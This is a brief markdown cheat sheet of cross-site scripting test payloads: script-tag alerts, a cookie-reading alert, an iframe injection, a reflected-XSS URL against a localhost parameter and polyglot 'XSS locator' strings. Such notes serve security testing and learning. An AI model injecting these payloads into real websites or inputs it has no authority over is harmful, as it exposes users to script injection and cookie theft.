# XSS (CROSS SITE SCRIPTING)

```javascript
<script>alert("XSS")</script>
<script>alert(document.cookie)</script>
```

iframe: `<iframe src="http://www.cnn.com"></iframe>`  
Stored cookie: `<script>alert(document.cookie)</script>`
Refleced (vulnerable parameter): `http://localhost/xss_r/?name=<script>alert(document.cookie)</script`


Cheatsheet
----------

XSS locator:

```javacsript
';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

XSS locator 2:

```
'';!--"<XSS>=&{()}
```
